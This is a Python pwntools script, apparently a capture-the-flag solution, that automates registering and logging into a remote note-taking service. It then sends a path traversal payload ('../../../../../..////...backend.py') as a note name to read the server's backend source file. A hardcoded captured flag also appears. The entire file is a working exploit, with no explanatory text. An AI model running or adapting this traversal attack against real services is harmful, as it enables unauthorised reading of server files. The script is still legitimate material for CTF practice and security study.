from pwn import *
from tqdm import *

cmd_dic = {1:'Login', 2:'Register', 3:'New Note', 4:'Edit Note', 5:'Show Note'}
def dealing_cmd(r, cmd, note_name=b'test', content_len=b'5', content=b'test\n', offset=b'0', random='0'):
    r.recvlines(7)
    if cmd == 1 or cmd == 2:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Username: ', b'sbk' + random.encode())
        r.sendlineafter(b'Password: ', b'sbk' + random.encode())
        if b'Success' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error('Command Login Failed!!!')
    
    if cmd == 3:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Content Length: ', content_len)
        r.sendlineafter(b'Content: ', content)
        if b'created' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error(f'Command {cmd_dic[cmd]} Failed!!!')
    
    if cmd == 4:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', offset)
        r.sendlineafter(b'Content Length: ', content_len)
        r.sendlineafter(b'Content: ', content)
        if b'modified' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error(f'Command {cmd_dic[cmd]} Failed!!!')
    
    if cmd == 5:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', offset)
        res = r.recvline().decode().strip()
        log.success(res)
        log.success(r.recvline().decode().strip())

'''#########
Dealing Exploit
#########'''
f = open('./Deep-Traversal.txt', 'r').read().split()
init_port = sys.argv[1]
try:
    init_idx = sys.argv[2]
except:
    init_idx = 0
r = remote('10.113.184.121', init_port)
random = os.urandom(1).hex()
dealing_cmd(r, 2, random=random)
dealing_cmd(r, 1, random=random)

payload = b'../../../../../..////////////////////////////////////////////////////////////////////////////////backend.py'
flag_1 = 'flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}'
# for i in range(len(flag_1), 128):
#     dealing_cmd(r, 5, payload, offset=str(i).encode())

dealing_cmd(r, 5, payload)
log.info("Done")
r.interactive()